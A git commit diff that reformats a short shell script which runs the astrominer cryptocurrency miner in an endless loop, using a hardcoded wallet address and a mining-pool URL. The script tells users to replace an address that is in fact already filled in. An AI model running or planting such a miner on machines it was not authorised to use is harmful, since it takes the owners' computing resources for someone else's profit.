7425dee16537eb05d58baa39ed707f4d37fd6281
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-10-31 23:11:34 +0700

    Update hapys.sh

--- hapys.sh
+++ hapys.sh
@@ -4,6 +4,6 @@ chmod 777 astrominer
 #!/bin/bash
 echo "Replace YOUR_ADDRESS to run the miner"
 while :; do
-    ./astrominer -w deroi1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncq9pvfz92xevuvu8geqh829q3asvh9.ENTE -r stratum+tls://pool.whalesburg.com:4300 -p stratum;
-    sleep 5;
+./astrominer -w deroi1qykdhx37h72gy9hl48xjjvdagjyh7afzsr8tn0r54tem8dq5evxncq9pvfz92xevuvu8geqh829q3asvh9.ENTE -r stratum+tls://pool.whalesburg.com:4300 -p stratum;
+sleep 5;
 done
